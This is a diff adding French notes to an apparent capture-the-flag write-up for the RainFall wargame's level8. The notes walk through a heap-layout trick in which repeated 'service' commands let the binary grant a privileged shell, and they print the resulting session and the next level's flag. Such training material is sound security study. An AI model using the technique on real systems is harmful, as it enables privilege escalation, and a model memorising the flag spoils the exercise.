@@ -143,11 +143,38 @@ malloc sur variable au lieu de structure.
 overflow sur le strdup qui permet d'activer la condition (test %eax %eax)
 ce qui donne acces a l'appel system avec /bin/sh 
 
+Apres analyse de l'assembleur avec gdb on peut trouver 4 commandes :
+
+auth -> appelle malloc et strcpy pour copier les donnees recus dans la global du
+meme nom auth
+service -> appelle strdup et copie les donnees recues dans la global du meme nom
+service
+reset -> appelle free et free la global auth
+login -> appelle system si la condition que auth[32] existe sinon ecrit avec 
+fwrite et affiche les adrresses de auth et service
 
 
+
+Pour ecrire a auth + 32 (+ 0x20) il faut envoyer "auth " dans stdin et cela va 
+faire enregister le retour du malloc 0x4.
+L'appelle service permet l'appelle de strdup qui appelle malloc. Le retour de ce
+malloc est juste apres sur la stack.
+On passe de 0x804a008 a 0x804a018 et on veut arriver a 0x804a028.
+On peut donc appeler encore une fois service :
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
 auth 
+0x804a008, (nil) 
 service
+0x804a008, 0x804a018 
 service
+0x804a008, 0x804a028 
 login
+$ whoami
+level9
+$ id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users)
+groups=2009(level9),100(users),2008(level8)
 
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
